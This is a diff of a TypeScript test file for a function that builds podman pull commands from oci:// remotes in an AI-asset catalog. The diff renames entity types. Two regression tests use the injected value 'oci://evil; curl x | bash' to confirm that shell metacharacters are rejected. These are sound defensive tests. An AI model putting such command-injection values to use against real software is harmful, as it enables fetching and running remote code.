@@ -55,7 +55,7 @@ describe('getAdoptionAction', () => {
   it('returns podman pull command for the first oci:// remote', () => {
     const action = getAdoptionAction(
       entity({
-        specType: 'ai-model',
+        specType: 'ai-tool',
         remotes: [
           { url: 'https://not-oci.example.com', type: 'other' },
           { url: 'oci://registry.example.com/models/foo:latest', type: 'oci' },
@@ -71,7 +71,7 @@ describe('getAdoptionAction', () => {
   it('falls through to git-sourced action when the ai-asset-source annotation is oci but no oci:// remote exists (finding #1 regression)', () => {
     const action = getAdoptionAction(
       entity({
-        specType: 'ai-model',
+        specType: 'ai-tool',
         annotations: { 'rhdh.io/ai-asset-source': 'oci' },
         location: {
           type: 'git',
@@ -229,7 +229,7 @@ describe('getAdoptionAction', () => {
   it('rejects an oci:// remote containing shell metacharacters (clipboard injection regression)', () => {
     const action = getAdoptionAction(
       entity({
-        specType: 'ai-model',
+        specType: 'ai-tool',
         remotes: [{ url: 'oci://evil; curl x | bash', type: 'oci' }],
       }),
     );
@@ -239,7 +239,7 @@ describe('getAdoptionAction', () => {
   it('skips an unsafe oci:// remote and resolves the next valid one', () => {
     const action = getAdoptionAction(
       entity({
-        specType: 'ai-model',
+        specType: 'ai-tool',
         remotes: [
           { url: 'oci://evil; curl x | bash', type: 'oci' },
           { url: 'oci://registry.example.com/models/foo:latest', type: 'oci' },
@@ -255,7 +255,7 @@ describe('getAdoptionAction', () => {
   it('accepts an oci:// reference with a registry port and tag', () => {
     const action = getAdoptionAction(
       entity({
-        specType: 'ai-model',
+        specType: 'ai-tool',
         remotes: [
           {
             url: 'oci://registry.example.com:5000/models/foo:latest',
@@ -324,14 +324,14 @@ const skill: Entity = {
 
 const agent: Entity = {
   apiVersion: 'backstage.io/v1alpha1',
-  kind: 'Component',
+  kind: 'AiResource',
   metadata: {
     name: 'dev-assistant',
     namespace: 'default',
     description: 'AI developer assistant',
     tags: ['agent'],
   },
-  spec: { type: 'ai-agent', lifecycle: 'experimental', owner: 'team-ml' },
+  spec: { type: 'agent', lifecycle: 'experimental', owner: 'team-ml' },
 };
 
 const entities = [skill, agent];
